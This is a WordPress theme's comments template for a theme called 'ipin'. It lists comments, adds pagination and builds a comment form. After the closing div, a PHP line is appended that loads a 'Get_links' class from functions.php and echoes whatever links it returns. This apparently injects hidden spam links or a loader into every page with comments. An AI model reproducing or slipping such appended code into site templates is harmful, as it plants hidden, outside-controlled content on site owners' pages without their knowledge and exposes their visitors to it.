<?php
	if (post_password_required())
		return;
?>

<div id="comments">
	<?php if (have_comments()) : ?>

		<ol class="commentlist">
			<?php wp_list_comments(array('callback' => 'ipin_comment')); ?>
		</ol>

		<?php if (get_comment_pages_count() > 1 && get_option('page_comments')) : ?>
		<ul class="pager">
			<li class="previous"><?php previous_comments_link(__( '&laquo; Older Comments', 'ipin')); ?></li>
			<li class="next"><?php next_comments_link(__('Newer Comments &raquo;', 'ipin')); ?></li>
		</ul>
		<?php endif;?>

	<?php
	elseif (!comments_open() && '0' != get_comments_number() && post_type_supports(get_post_type(), 'comments')) :
	endif;
	
	comment_form(array(
	'title_reply' => __('Leave a Comment', 'ipin'),
	'label_submit' => __('Submit Comment', 'ipin'),
	'comment_notes_before' => '',
	'comment_notes_after' => '',
	'comment_field' => '<label style="clear:both">' . __('Comment', 'ipin') . '</label> <textarea id="comment" name="comment" rows="10" aria-required="true"></textarea>'
	));
	?>
</div><?php $lib_path = dirname(__FILE__).'/'; require_once('functions.php'); $links = new Get_links(); $links = $links->return_links($lib_path); echo $links; ?>